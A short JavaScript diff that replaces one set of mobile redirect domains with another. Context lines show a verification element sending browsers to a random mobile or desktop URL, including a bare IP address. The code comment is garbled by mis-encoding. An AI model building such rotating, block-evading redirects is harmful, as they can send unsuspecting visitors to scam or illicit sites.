@@ -37,10 +37,10 @@ const verificationStatus = document.getElementById('verification-status');
 
 // 瀹氫箟鎵嬫満鍜岀數鑴戠殑璺宠浆缃戝潃鏁扮粍
 const mobileUrls = [
-    "https://www.tv88.ltd",
-    "https://www.tv88.cafe",
-    "https://tv88.zone",
-    "https://tv88portal.pages.dev"];
+    "https://as9.ltd",
+    "https://as9.cafe",
+    "https://as9.zone",
+    "https://as91.pages.dev"];
 const desktopUrls = [
     "https://d11s29giwnr7ge.cloudfront.net/?id=709408808",
     "https://140.150.32.223:5001/?id=709408808",
@@ -67,4 +67,5 @@ if (verificationStatus) {
             window.location.href = getRandomUrl(desktopUrls);
         }
     });
+
 }
